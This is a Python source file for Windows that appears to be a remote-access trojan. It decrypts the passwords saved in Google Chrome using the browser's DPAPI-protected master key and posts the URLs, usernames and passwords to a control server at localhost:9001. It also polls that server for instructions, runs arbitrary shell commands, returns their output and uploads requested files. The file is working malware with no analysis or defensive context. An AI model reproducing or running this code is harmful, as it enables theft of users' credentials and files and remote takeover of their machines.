# -*- coding: utf-8 -*-
import os
import time
import requests
import shutil
import subprocess
import winreg as win
import json
import base64
import sqlite3
from Cryptodome.Cipher import AES
import win32crypt

def get_master_key():
    with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State', "r", encoding='utf-8') as f:
        local_state = f.read()
        local_state = json.loads(local_state)
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]  # removing DPAPI
    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
    return master_key

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = generate_cipher(master_key, iv)
        decrypted_pass = decrypt_payload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    except Exception as e:

        return "Chrome < 80"


def search():

    master_key = get_master_key()
    login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\default\Login Data'
    shutil.copy2(login_db, "Logintemp.db")
    conn = sqlite3.connect("Logintemp.db")
    cursor = conn.cursor()
    pack = []

    try:
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        for r in cursor.fetchall():
            url = r[0]
            username = r[1]
            encrypted_password = r[2]
            decrypted_password = decrypt_password(encrypted_password, master_key)
            data = {"ulr": url,
                    "user": username,
                     "password": decrypted_password}
            pack.append(data)

        url = 'http://localhost:9001'
        packstr = str(pack)
        post = requests.post(url, data=packstr.encode())

    except Exception as e:
        post = requests.post(url, data=e.encode())

    cursor.close()
    conn.close()

    try:
        os.remove("Logintemp.db")
    except Exception as e:
        pass



def connect():
    while True:
        head = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"}
        req = requests.get('http://localhost:9001', headers=head)
        command = req.text

        if 'terminate' in command:
            break

        elif 'get' in command:
            get, path = command.split("*")

            if os.path.exists(path):
                url = 'http://localhost:9001'
                files = {'file': open(path, 'rb')}
                r = requests.post(url, files=files)
            else:
                post_response = requests.post(url='http://localhost:9001',
                                              data='[Nao foi possivel transferir o arquivo'.encode())
        elif 'search' in command:
            search()
        else:
            CMD = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                   stderr=subprocess.PIPE)
            post_response = requests.post(url='http://localhost:9001', data=CMD.stdout.read())
            post_response = requests.post(url='http://localhost:9001', data=CMD.stderr.read())
        time.sleep(3)

if __name__ == '__main__':
    connect()

